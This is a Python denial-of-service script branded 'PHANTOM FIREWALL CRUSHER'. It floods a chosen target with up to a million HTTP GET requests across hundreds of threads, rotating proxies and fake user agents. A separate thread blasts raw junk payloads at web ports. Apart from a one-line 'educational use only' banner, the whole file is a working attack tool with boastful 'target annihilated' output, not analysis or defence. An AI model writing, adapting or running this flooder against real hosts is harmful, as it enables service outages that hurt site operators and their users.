#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WARNING: FOR EDUCATIONAL USE ONLY - UNAUTHORIZED ACCESS PROHIBITED

import argparse
import random
import sys
import time
import threading
import socket
import ssl
from queue import Queue
from colorama import Fore, init
import requests
from fake_useragent import UserAgent

init(autoreset=True)
print(f"{Fore.RED}▓▓▓  ▒▒▒  ░░░  PHANTOM FIREWALL CRUSHER v7.37  ░░░  ▒▒▒  ▓▓▓")

class NuclearStrike:
    def __init__(self):
        self.proxy_pool = Queue()
        self.user_agents = [UserAgent().random for _ in range(1000)]
        self.counter = 0
        self.running = True
        self.firewall_ports = [80, 443, 8080, 8443]
        self.firewall_buster_payloads = [
            b"GET / HTTP/1.1\r\nHost: \r\n\r\n",
            b"X" * 2048,
            b"\x00" * 4096,
            b"CONNECT HTTP/1.1\r\n\r\n"
        ]

    def load_proxies(self, proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                self.proxy_pool.put(line.strip())

    def firewall_penetration(self, target_ip):
        for port in self.firewall_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, port))
                for payload in self.firewall_buster_payloads:
                    sock.sendall(payload * random.randint(50, 200))
                    time.sleep(0.01)
                sock.close()
            except Exception as e:
                continue

    def http_hammer(self, target, req_count, threads, timeout):
        url = f"http://{target}" if not target.startswith('http') else target
        while self.running and self.counter < req_count:
            try:
                proxy = {'http': self.proxy_pool.get()}
                headers = {'User-Agent': random.choice(self.user_agents)}
                requests.get(url, proxies=proxy, headers=headers, timeout=timeout)
                self.counter += 1
                self.proxy_pool.put(proxy['http'])
                print(f"{Fore.GREEN}[+] FIREWALL BREACHED | REQUESTS: {self.counter}", end='\r')
            except:
                self.proxy_pool.put(proxy['http'])
                continue

    def launch_attack(self, target, req_count, threads, timeout, proxy_file):
        self.load_proxies(proxy_file)
        target_ip = socket.gethostbyname(target.split('//')[-1].split('/')[0])
        
        firewall_thread = threading.Thread(target=self.firewall_penetration, args=(target_ip,))
        firewall_thread.start()

        for _ in range(threads):
            thread = threading.Thread(target=self.http_hammer, args=(target, req_count, threads, timeout))
            thread.daemon = True
            thread.start()

        while self.counter < req_count and self.running:
            time.sleep(0.1)
        
        print(f"\n{Fore.RED}▓▓▓  TARGET ANNIHILATED - {self.counter} NUCLEAR PAYLOADS DELIVERED  ▓▓▓")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PHANTOM FIREWALL CRUSHER")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-r", "--requests", type=int, default=1000000, help="Total requests to send")
    parser.add_argument("-th", "--threads", type=int, default=500, help="Attack threads")
    parser.add_argument("-to", "--timeout", type=int, default=5, help="Request timeout")
    parser.add_argument("-p", "--proxies", required=True, help="Proxy list file")
    
    args = parser.parse_args()
    
    strike = NuclearStrike()
    try:
        strike.launch_attack(args.target, args.requests, args.threads, args.timeout, args.proxies)
    except KeyboardInterrupt:
        strike.running = False
        print(f"\n{Fore.YELLOW}▓▓▓  OPERATION ABORTED - SYSTEMS GOING DARK  ▓▓▓")
        sys.exit(0)
